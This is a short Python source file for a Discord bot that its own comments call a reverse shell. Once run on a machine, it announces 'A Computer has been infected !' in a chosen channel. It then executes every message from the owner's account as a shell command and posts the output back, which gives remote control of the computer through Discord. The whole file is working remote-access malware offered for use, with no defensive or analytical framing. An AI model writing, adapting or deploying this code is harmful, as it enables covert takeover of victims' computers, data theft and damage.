# -*- coding: utf-8 -*-

from subprocess import check_output
import discord
from discord.ext import commands

# Reverse Shell Discord 

owner_id = YOUR ID
bot_token = "YOUR BOT TOKEN"


# Warn when executed

warn = True


# Warn channel

channel_id = 1234567891011

# Ignore Error logs

ignore = False


# Only the Owner can execute Commands

private = True


bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

@bot.event
async def on_ready():
    if warn:
        for guild in bot.guilds:
            for channel in guild.channels:
                if channel.id == channel_id:
                    try:
                        await channel.send("A Computer has been infected !")
                    except:
                        pass
                    return

@bot.listen()
async def on_message(mess):
    if private:
        if mess.author.id != owner_id:
            return
    try:
        output = check_output(mess.content, shell=True)
        if output.decode("cp850") in ["", None]:
            await mess.reply(content="Task Executed :white_check_mark:")

        else:   
            await mess.reply(content=output.decode("cp850"))
    except:
        if ignore == False:
            await mess.reply(content=":x: An error has occured.")

    





bot.run(bot_token)